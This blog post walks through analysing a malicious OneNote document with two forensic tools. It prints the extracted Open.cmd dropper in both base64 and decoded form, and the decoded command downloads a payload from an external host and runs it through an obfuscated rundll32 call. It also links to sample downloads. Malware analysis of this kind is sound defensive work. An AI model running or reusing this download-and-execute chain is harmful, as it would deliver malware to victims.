+++
title = "Exploring OneNote Forensic tools"
draft = false
tags = ["OneNote","Maldocs",".one"]
categories = ["Malware"]
ShowToc = true
author = ["connar"]
+++

## Intro
In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:  
- OneNoteAnalyzer.exe
- pyonenote.py

The sample I practised on is the following:
- https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/

## Viewing the sample
Opening the sample in an online .one viewer, we can observe the following:

![](/posts/onenote/onenote1.png)  

We can see that a .cmd script is placed at the 'Open' button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let's use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.

## OneNoteAnalyzer
The use of this tool is simple. We only need to run the command ```OneNoteAnalyzer.exe --file [file]``` and get the output and extracted files:  

![](/posts/onenote/onenote2.png)  

Let's also use the pyonenote.py tool before proceeding to analyze the extracted files.

## pyonenote
We can get the pyonenote tool from the following repo:  
- https://github.com/DissectMalware/pyOneNote  

Running the script finds the same information as the previous tool, just in a more verbose way:  

![](/posts/onenote/onenote4.png)  

## Extracted files - Open.cmd

The file that is of most interest to us is the open.cmd file. Opening the file and viewing its contents, we see the following command:
```cmd
powershell.exe [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('DQpAZWNobyBvZmYNCg0KcG93ZXJzaGVsbCBJbnZva2UtV2ViUmVxdWVzdCAtVVJJIGh0dHBzOi8vYXJhZGNhcGl0YWwuY29tL01wRDhZay8wMC5naWYgLU91dEZpbGUgQzpccHJvZ3JhbWRhdGFcYmlnLmpwZw0KY2FsbCBydSUxbDMyIEM6XHByb2dyYW1kYXRhXGJpZy5qcGcsRGxsUmVnaXN0ZXJTZXJ2ZXINCg0KZXhpdA0K')) > C:\ProgramData\in.cmd&&start /min C:\ProgramData\in.cmd ndl
```
Decoding the base64 code, we end with the following command:
```cmd
@echo off

powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg
call ru%1l32 C:\programdata\big.jpg,DllRegisterServer

exit
```

So basically this cmd file decodes an encoded base64 string, saves it in another cmd file named ```in.cmd``` and then runs it with the ndl parameter which specifies that directory names are not to be logged.

This decoded base64 string as we saw by decoding it is another powershell command that downloads file named ```00.gif``` and outputs it in another file named ```big.jpg```. Then it proceeds to run it by using rundll32 in an obfuscated way. So we can safely assume this file is a .dll file.

All that's left to do is analyze the DLL which can be found at:  
- https://bazaar.abuse.ch/sample/5fb7f3fac0a9b9ab243ee642a0775500c524166ef075035c9510ccbab76ad633/

## Extracted files - big.jpg
Downloading the file and running the ```file``` command on it, we get the following info:
```cmd
┌──(connar㉿kali)-[~/blog/oneNote_samples]
└─$ file big.jpg 
big.jpg: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
```

Initially opening the dll in Ghidra, it seems to be packed. For this purpose I uploaded it to any.run to observe its activity, and got the following feedback:  

![](/posts/onenote/onenote3.png)  

Searching various strings, hashes and even bytes, I found out that there was a debate of whether this malware was of the family ```Matanbuchus``` but it ended up being related to ```PikaBot``` and was named ```Beep-Malware```.  I will try and analyze this dll in [another post](https://connar.github.io/posts/beepmalware/) and share what I learned along the way:) 

That is it for this post!

**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.youtube.com/watch?v=Yhq_bd3ppBw">Guided Hacking: <i>Malicious OneNote Documents - Malware Analysis</i></a></li>
        <li> [2] <a href="https://github.com/pan-unit42/tweets/blob/master/2023-02-07-IOCs-for-probable-Matanbuchus-activity.txt">pan-unit42: 2023-02-07-IOCs-for-probable-Matanbuchus-activity.txt</i></a></li>
</i></a></li>
    </ul>
</blockquote>